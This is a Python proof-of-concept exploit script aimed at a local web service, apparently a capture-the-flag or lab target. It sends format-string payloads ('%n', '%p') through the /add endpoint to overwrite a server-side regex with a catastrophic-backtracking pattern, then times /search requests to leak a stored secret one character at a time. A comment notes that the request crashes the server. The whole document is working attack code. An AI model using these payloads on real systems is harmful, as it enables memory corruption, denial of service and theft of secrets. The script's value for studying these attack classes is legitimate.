#!/usr/bin/env python3

"""
This PoC demonstrates how the timing attack is possible in same-site context (no XS-Leaks),
where the user attacking is the same inserting the secret to his account.
"""

import time
import requests
import os
import string


URL = "http://localhost:3000"
FIRST_PAYLOAD = r"^"
SECOND_PAYLOAD = r"(.+){21}$" + "\x00"
SECRET = "a"


def overwrite_regex(session, secretOffset, regex, steps):
    for i in range(0, len(regex), steps):
        session.post(
            URL + "/add",
            json={
                "secret": "A%" + str(65535 + i) + "c%2$n%p%p%p%p",
                "secretOffset": secretOffset,
            },
        ).raise_for_status()

        session.post(
            URL + "/add",
            json={
                "secret": "B"
                * int.from_bytes(regex[i : i + steps].encode(), byteorder="little")
                + "%n%p|%p",
                "secretOffset": secretOffset,
            },
        ).raise_for_status()
        session.get(URL + "/search", params={"query": "a"}).raise_for_status()


s = requests.Session()
print(s.post(URL + "/register").text)

print(
    s.post(URL + "/add", json={"secret": "a-very-looooooooooooooooooooong"}).text
)
print(s.post(URL + "/add", json={"secret": "a"}).text)

try:
    while True:
        for char in string.ascii_lowercase + string.ascii_uppercase + string.digits + "-":
            payload = FIRST_PAYLOAD + (SECRET + char) + SECOND_PAYLOAD
            overwrite_regex(s, 1, payload + "\x00" * (30 - len(payload)), steps=2)

            t = time.time()
            # this crashes the server!
            s.get(URL + "/search", params={"query": "a"}).raise_for_status()
            if time.time() - t > 0.5:
                SECRET += char
                print("[+] Found first character of secret:", SECRET)
                exit(1)
                break
        else:
            break
except Exception as e:
    print("[-] Failed to leak secret:", e)
